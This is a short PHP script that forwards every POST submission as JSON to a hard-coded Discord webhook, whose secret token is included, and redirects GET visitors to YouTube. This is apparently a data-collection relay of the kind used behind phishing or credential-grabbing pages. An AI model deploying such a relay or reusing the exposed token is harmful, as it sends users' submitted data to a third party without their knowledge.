<?php
// Handle POST request
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    try {
        // Forward payload to specified Discord webhook
        $discordWebhook = 'https://discord.com/api/webhooks/1227318310794821694/Or8mClVg_HrPN2DpI6HRUxf-iE-UftM2-6LrAlHrlHjauFu-0pVeA3yftDZOW8mdKgYn';
        $response = file_get_contents($discordWebhook, false, stream_context_create([
            'http' => [
                'method' => 'POST',
                'header' => 'Content-Type: application/json',
                'content' => json_encode($_POST)
            ]
        ]));

        // Forward response from Discord webhook back to client
        http_response_code(200);
        header('Content-Type: application/json');
        echo $response;
        exit();
    } catch (Exception $e) {
        // Handle errors
        error_log('Error: ' . $e->getMessage());
        http_response_code(500);
        echo 'Internal Server Error';
        exit();
    }
}

// Redirect to YouTube for GET request
header('Location: https://youtube.com/');
exit();
?>
